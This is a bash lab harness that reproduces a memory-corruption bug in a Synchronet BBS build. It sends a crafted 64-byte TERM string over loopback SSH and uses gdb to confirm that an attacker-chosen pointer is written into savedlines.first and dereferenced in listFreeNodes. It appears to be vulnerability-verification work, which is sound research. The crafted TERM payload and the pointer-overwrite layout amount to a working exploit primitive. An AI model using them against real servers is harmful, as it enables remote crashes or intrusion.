#!/usr/bin/env bash
# W24: one bounded counterexample lane for the W21 live shipped-3.20b claim.
# Under gdb, drive the same 64-byte chosen TERM over loopback SSH and print the
# fault si_addr, the corrupted savedlines.first and node at the fault frame.
# Prediction: si_addr == chosen first (0x465541544f4f2d45) + flags offset.
# Uses the already-provisioned pinned db9c5d6f build; no new claim or rung change.
set -uo pipefail
cd "$(dirname "$0")/../../.."
HERE=$PWD
TREE=$HERE/src-tree/320b
P=$HERE/provision
L=$P/local/usr/lib/x86_64-linux-gnu
PARENT=db9c5d6fd37ef74b6e6ca647308d351e656de18d
E=$HERE/release-label/term320b/real320b/evidence
LOG=$E/gdb-faultaddr.log
CLIENT=$E/client-faultaddr.log
FIRST=0x465541544f4f2d45
EXPECTED=0x465541544f4f2d65

pass=0
fail=0
expect() {
    local file=$1 pattern=$2 label=$3
    if grep -qE "$pattern" "$file"; then
        echo "PASS $label"
        pass=$((pass + 1))
    else
        echo "FAIL $label (missing: $pattern in $file)"
        fail=$((fail + 1))
    fi
}

test "$(git -C "$TREE" rev-parse HEAD)" = "$PARENT" || {
    echo "TREE_HEAD_MISMATCH"; exit 2;
}

export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
FLIBS="-L$L -larchive -lnettle -lacl -llzma -lzstd -llz4 -lbz2 -lz -lxml2"

cleanup_stale() {
    pkill -9 -f "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne" 2>/dev/null || true
    sleep 1
}
cleanup_stale

HN=$(hostname)
INI="$TREE/ctrl/sbbs.$HN.ini"
PORT=$((24000 + $$ % 500))
: > "$LOG"
: > "$CLIENT"
cat > "$INI" <<EOF
; W24 lab-only loopback SSH config (gitignored tree)
[Global]
	Hostname =
	Interface = 127.0.0.1
	OutboundInterface = 127.0.0.1
	TempDirectory =
	LogLevel = Debugging
	TLSErrorLevel = Debugging

[BBS]
	AutoStart = true
	SSHInterface = 127.0.0.1
	SSHErrorLevel = Debugging
	SSHPort = $PORT
	SSHConnectTimeout = 10s
	FirstNode = 1
	LastNode = 4
	Options = XTRN_MINIMIZED | ALLOW_SSH | SSH_ANYAUTH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS

[Mail]
	AutoStart = false

[FTP]
	AutoStart = false

[Web]
	AutoStart = false

[Services]
	AutoStart = false

[UNIX]
	Daemonize = False
	PidFile = sbbs-w24.pid
	LogFacility = User
	LogIdent = synchronet-w24
	umask = 077
EOF

# Instrumentation-only probe; answer.cpp is restored on exit.
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/release-label/term320b/real320b/probe-320b.patch") || exit 3
cleanup_stale
make -C "$TREE/3rdp/build" jslib > "$P/jslib-w24.log" 2>&1 || { echo "JSLIB_FAILED"; exit 4; }
make -C "$TREE/src/sbbs3" FILE_LIBS="$FLIBS" > "$P/build-w24.log" 2>&1 || { echo "BUILD_FAILED"; exit 4; }

CHOSEN="$(printf 'A%.0s' $(seq 1 41))$(printf 'B%.0s' $(seq 1 3))MISHE-OOTAUFTAUF$(printf 'Z%.0s' $(seq 1 4))"

restore() {
    git -C "$TREE" checkout -- src/sbbs3/answer.cpp
    pkill -9 -f "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne" 2>/dev/null || true
}
trap restore EXIT

(cd "$TREE" && SBBSCTRL="$TREE/ctrl" gdb -q -batch \
    -ex 'set pagination off' \
    -ex 'run' \
    -ex 'printf "\n=== W24_FAULT_BEGIN ===\n"' \
    -ex 'printf "W24_SI_ADDR=%p\n", $_siginfo._sifields._sigfault.si_addr' \
    -ex 'printf "W24_SIGINFO=%s\n", $_siginfo' \
    -ex 'x/i $pc' \
    -ex 'info registers rax rbx rcx rdx rsi rdi r8 r9' \
    -ex 'frame 0' \
    -ex 'printf "W24_LIST_FIRST=%p\n", list->first' \
    -ex 'printf "W24_NODE=%p\n", node' \
    -ex 'printf "W24_FLAGS_OFFSET=%p\n", &((list_node_t*)0)->flags' \
    -ex 'bt 8' \
    -ex 'printf "=== W24_FAULT_END ===\n"' \
    --args "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs" nd nh nj ne \
    > "$LOG" 2>&1) &
GPID=$!
for i in $(seq 1 60); do
    grep -q 'SSH Server listening' "$LOG" && break
    sleep 0.5
done
(for i in $(seq 1 4); do echo x; sleep 0.2; done) | \
    TERM="$CHOSEN" timeout 14 ssh -tt \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=none -o PubkeyAuthentication=no \
      -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
      -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
      -p "$PORT" lab@127.0.0.1 > "$CLIENT" 2>&1 || true
wait "$GPID" || true
restore
trap - EXIT

echo "W24 fault-address driver finished $(date -u +%FT%TZ)"
grep -n 'REAL_320B_PROBE' "$LOG" | head -3 || true
grep -n -A12 'W24_FAULT_BEGIN' "$LOG" | head -18 || true

expect "$LOG" 'REAL_320B_PROBE sizeof=41 l=64 off41=42 cv=4853494d first=0x465541544f4f2d45' 'live answer() wrote chosen pointer'
expect "$LOG" 'listFreeNodes \(list=' 'fault frame is listFreeNodes'
# gdb's $_siginfo is nil for this threaded SIGSEGV stop (preserved as a
# negative in evidence/negatives.txt), so prove the dereference directly:
# the faulting instruction reads 0x20(%rax) and rax is the chosen pointer.
expect "$LOG" 'mov +0x20\(%rax\),%rax' 'fault instruction reads node->flags at +0x20(%rax)'
expect "$LOG" "rax +0x465541544f4f2d45" 'fault rax == chosen savedlines.first'
expect "$LOG" "W24_LIST_FIRST=$FIRST" 'list->first at fault == chosen pointer'
expect "$LOG" "W24_NODE=$FIRST" 'node at fault == chosen pointer'
expect "$LOG" 'W24_FLAGS_OFFSET=0x20' 'flags field offset == 0x20'
echo "RESULT: PASS=$pass FAIL=$fail"
exit $((fail > 0))
